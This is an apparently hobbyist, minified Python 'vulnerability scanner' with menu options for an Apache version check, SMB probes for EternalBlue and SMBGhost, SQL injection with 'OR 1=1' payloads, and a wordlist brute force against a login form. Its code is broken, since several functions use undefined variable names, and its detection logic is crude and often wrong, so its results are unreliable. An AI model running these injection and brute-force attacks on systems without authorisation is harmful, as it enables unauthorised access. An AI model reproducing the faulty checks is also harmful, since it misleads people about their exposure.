#!/usr/bin/python3

# Vulnerability Scanner | Done by Sxmpl3 (https://github.com/Sxmpl3)
v=input
z=print
I=Exception
g=str
Q=open
import requests
w=requests.Session
e=requests.get
from impacket.smbconnection import SMBConnection
def q():
 o=v("Target URL: ")
 y=e(o)
 m=y.headers
 if 'Server' in m and 'Apache' in m['Server']:
  A=m['Server']
  if '2.4.18' in A:
   z("Apache server has XYZ Vulnerability")
  else:
   z("")
   z("Apache server not vulberable")
def r():
 z("")
 j=v("Target IP: ")
 def n():
  try:
   b=SMBConnection('','','','')
   b.connect(j,139,timeout=2)
   z("")
   z("EternalBlue Vulnerability found")
  except I as e:
   if g(e).find("STATUS_LOGON_FAILURE")!=-1:
    z("")
    z("The target isn't vulnerable to EternalBlue")
   else:
    z("")
    z("EternalBlue Scan error")
 def f():
  try:
   b=SMBConnection('','','','')
   b.connect(j,445,timeout=2)
   Y=b.getDialect()
   if Y>=b.SMB2_DIALECT_3_1_1:
    z("")
    z("SMBGhost Vulnerability found")
   else:
    z("")
    z("The target isn't vulnerable to SMBGhost")
  except I:
   z("")
   z("SMBGhost Scan error")
 n()
 f()
def T():
 U=["' OR 1=1 --","' OR 'a'='a"]
 for R in U:
  N=v("Target URL: ")
  B=v("Parametrer: ")
  o=f"{url}?{parameter}={payload}"
  y=e(o)
  if "error" in y.text.lower():
   z("")
   z(f"SQL Injection vulnerability detected at: {target_url}")
  else:
   z("")
   z("No SQLI")
def L():
 o=v("Target URL: ")
 G=v("User parameter: ")
 W=v("Password parameter: ")
 a="users.txt"
 J="passwords.txt"
 with Q(a,'r')as user_file:
  h=user_file.read().splitlines()
 with Q(J,'r')as pswd_file:
  E=pswd_file.read().splitlines()
 C=w()
 for c in h:
  for t in E:
   P={G:c,W:t}
   y=C.post(o,data=P)
   if "incorrect" not in y.text.lower():
    z("")
    z(f"Successful login - Username: {user}, Password: {password}")
    return
 z("")
 z("Brute force attack failed")
def X():
 z("")
 z("Scanner Vulnerability | Done by Sxmpl3 (https://github.com/Sxmpl3)")
 z("--------------------------------------------------------------------")
 z("1 --> Basic Apache Scan")
 z("")
 z("2 --> SMB")
 z("")
 z("3 --> Web Scan")
 z("")
 d=v("Select one: ")
 if d=="1":
  q()
 elif d=="2":
  r()
 elif d=="3":
  z("")
  z("///// 1 --> Basic SQLI")
  z("")
  z("///// 2 --> Basic BruteForce")
  z("")
  F=v("Select one: ")
  if F=="1":
   T()
  elif F=="2":
   L()
if __name__=='__main__':
 X()
# Created by pyminifier (https://github.com/liftoff/pyminifier)

